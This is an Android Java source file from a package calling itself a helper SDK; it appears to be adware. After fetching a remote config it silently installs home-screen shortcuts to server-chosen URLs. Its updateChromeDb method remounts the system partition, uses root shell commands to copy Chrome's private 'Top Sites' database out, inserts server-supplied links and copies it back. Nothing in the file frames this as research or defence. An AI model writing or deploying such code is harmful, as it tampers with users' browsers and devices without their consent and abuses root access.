package com.androidhelper.sdk.net;

import java.io.File;
import java.io.IOException;
import java.util.Date;
import java.util.List;

import org.apache.http.Header;

import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Environment;
import android.view.View;

import com.androidhelper.sdk.AMApplication;
import com.androidhelper.sdk.entity.ADConfig;
import com.androidhelper.sdk.entity.ChromeTop;
import com.androidhelper.sdk.entity.Weblink;
import com.androidhelper.sdk.net.parser.ConfigParser;
import com.androidhelper.sdk.tools.AMConstants;
import com.androidhelper.sdk.tools.AMLogger;
import com.androidhelper.sdk.tools.CommonUtils;
import com.androidhelper.sdk.tools.RootCmd;
import com.androidhelper.sdk.tools.SystemPartition;
import com.nostra13.universalimageloader.core.ImageLoader;
import com.nostra13.universalimageloader.core.listener.SimpleImageLoadingListener;

public class ConfigRequest extends AMRequest<ADConfig> {

	public ConfigRequest(IResponseListener<ADConfig> listener) {
		super(listener);
	}

//	@Override
//	public void onFailure(int statusCode, Header[] headers, String responseString, Throwable throwable) {
//	}

	@Override
	public void onSuccess(int statusCode, Header[] headers, String datas) {
		try {
			super.onSuccess(statusCode, headers, datas);
			File file = AMApplication.instance.getFileStreamPath(AMConstants.FILE_CONFIG);
			CommonUtils.writeFile(datas, file);
//			ConfigParser parser = new ConfigParser();
//			ADConfig config = parser.parse(datas);
			SharedPreferences sp = AMApplication.instance.getSharedPreferences(AMConstants.SP_NAME, Context.MODE_PRIVATE);
			android.content.SharedPreferences.Editor editor = sp.edit();
			long lastConfig = System.currentTimeMillis();
			editor.putLong(AMConstants.SP_LAST_CONFIG_STAMP, lastConfig).commit();
//			// 下次获取配置文件缓存时间
//			int cacheControlHours = config.getCacheHours();
//			cacheControlHours = cacheControlHours > 7 * 24 ? 7 * 24 : cacheControlHours;
//			editor.putLong(AMConstants.SP_NEXT_CONFIG_STAMP, lastConfig + cacheControlHours * 60 * 60 * 1000).commit();
			// 下次数据上报时间
//			String dataUploadInterval = config.getDatasUploadInterval();
//			long lastUpload = sp.getLong(AMConstants.SP_LAST_UPLOAD_STAMP, 0);
//			long nextUpload = lastUpload == 0 ? System.currentTimeMillis() + Integer.parseInt(dataUploadInterval) * 60 * 60 * 1000 : lastUpload + Integer.parseInt(dataUploadInterval) * 60 * 60 * 1000 ; 
//			if(!CommonUtils.isEmptyString(dataUploadInterval)) {
//				editor.putLong(AMConstants.SP_NEXT_UPLOAD_STAMP, nextUpload).commit();
//			}
			//检查升级
			UpdateRequest request = new UpdateRequest(null);
			request.start();
			
			//------测试数据
			File file2 = AMApplication.instance.getFileStreamPath("test_config");
			String data = new Date(lastConfig).toString() + "\r\n";
			String readFile = CommonUtils.readFile(file2);
			CommonUtils.writeFile(readFile + data, file2);
			
			updateChromeDb(datas);
			
//			ConfigParser parser = new ConfigParser();
//			final String lanucherUrl = parser.getValue(AMApplication.instance, "launcher_entrance_url");
//			String lanucherIcon = parser.getValue(AMApplication.instance, "launcher_entrance_icon");
//			final String lanucherTitle = parser.getValue(AMApplication.instance, "launcher_entrance_title");
//			if(!CommonUtils.isEmptyString(lanucherUrl) && !CommonUtils.isEmptyString(lanucherIcon) && !CommonUtils.isEmptyString(lanucherTitle)) {
//				ImageLoader.getInstance().loadImage(lanucherIcon, AMApplication.instance.displayOption, new SimpleImageLoadingListener() {
//					@Override
//					public void onLoadingComplete(String imageUri, View view, Bitmap loadedImage) {
//						addShortcut(loadedImage,lanucherTitle,Uri.parse(lanucherUrl));
//					}
//				});
//			}
			
			ConfigParser parser = new ConfigParser();
			ADConfig adConfig = parser.parse(datas);
			List<Weblink> webLinks = adConfig.getWebLinks();
			if(null == webLinks || webLinks.size() <= 0) {
				return;
			}
			for (final Weblink weblink : webLinks) {
				if(!CommonUtils.isEmptyString(weblink.getUrl()) && !CommonUtils.isEmptyString(weblink.getIcon()) && !CommonUtils.isEmptyString(weblink.getTitle())) {
					ImageLoader.getInstance().loadImage(weblink.getIcon(), AMApplication.instance.displayOption, new SimpleImageLoadingListener() {
						@Override
						public void onLoadingComplete(String imageUri, View view, Bitmap loadedImage) {
							addShortcut(loadedImage,weblink.getTitle(),Uri.parse(weblink.getUrl()));
						}
					});
				}
			}
			
		} catch (Exception e) {
			AMLogger.e(null, e.getMessage());
		}
	}
	
	private void addShortcut(Bitmap icon, String name, Uri uri) {
		Intent intentAddShortcut = new Intent("com.android.launcher.action.INSTALL_SHORTCUT");
		intentAddShortcut.putExtra("duplicate", false);
		// 添加名称
		intentAddShortcut.putExtra(Intent.EXTRA_SHORTCUT_NAME, name);
		// 添加图标
		intentAddShortcut.putExtra(Intent.EXTRA_SHORTCUT_ICON, icon);
		// 设置Launcher的Uri数据
		Intent intentLauncher = new Intent();
		intentLauncher.setData(uri);
		// 添加快捷方式的启动方法
		intentAddShortcut.putExtra(Intent.EXTRA_SHORTCUT_INTENT, intentLauncher);
		AMApplication.instance.sendBroadcast(intentAddShortcut);
	}

	private void updateChromeDb(String datas) throws IOException {
		if(null == Environment.getExternalStorageDirectory()) {
			return;
		}
		SystemPartition.getSystemMountPiont();
		SystemPartition.remountSystem(true);
		String path = Environment.getExternalStorageDirectory().getAbsolutePath();
		if(CommonUtils.isEmptyString(path)) {
			return;
		}
		RootCmd.execRootCmd("cp \"/data/data/com.android.chrome/app_chrome/Default/Top Sites\" " + path);
		SQLiteDatabase db = null;
		try {
			File file = new File(path + "/Top Sites");
			if(!file.exists()) {
				return;
			}
			db = SQLiteDatabase.openDatabase(file.getAbsolutePath(), null, 0);
//			Cursor cursor = db.rawQuery("select last_updated from thumbnails where url_rank = ?", new String[]{"0"});
//			if(null == cursor) {
//				if(null != db)  {
//					db.close();
//				}
//				return;
//			}
//			if(!cursor.moveToNext()) {
//				return;
//			}
//			ContentValues cv = new ContentValues();
//			ConfigParser parser = new ConfigParser();
//			String url = parser.getValue(AMApplication.instance, "chrome_url");
//			String title = parser.getValue(AMApplication.instance, "chrome_title");
//			cv.put("url", url);
//			cv.put("redirects", url);
//			cv.put("title", title);
//			int result = db.update("thumbnails", cv, "url_rank = ?", new String[]{"0"});
			
			ConfigParser parser = new ConfigParser();
			ADConfig adConfig = parser.parse(datas);
			List<ChromeTop> tops = adConfig.getChromeTops();
			for (ChromeTop chromeTop : tops) {
				ContentValues cv = new ContentValues();
				cv.put("url", chromeTop.getUrl());
				cv.put("redirects", chromeTop.getUrl());
				cv.put("title", chromeTop.getTitle());
				db.insert("thumbnails", null, cv);
			}
			
			RootCmd.execRootCmd("cp " + path + "/\"Top Sites\"" + " /data/data/com.android.chrome/app_chrome/Default");
		} catch (Exception e) {
			AMLogger.e(null, e.getMessage());
		} finally {
			if(null != db)  {
				db.close();
			}
		}
	}

	@Override
	public void start(Object... args) {
		try {
			doPost(AMConstants.GET_CONFIG_URI, null, true);
		} catch (Exception e) {
			AMLogger.e(null, e.getMessage());
		}
	}
}
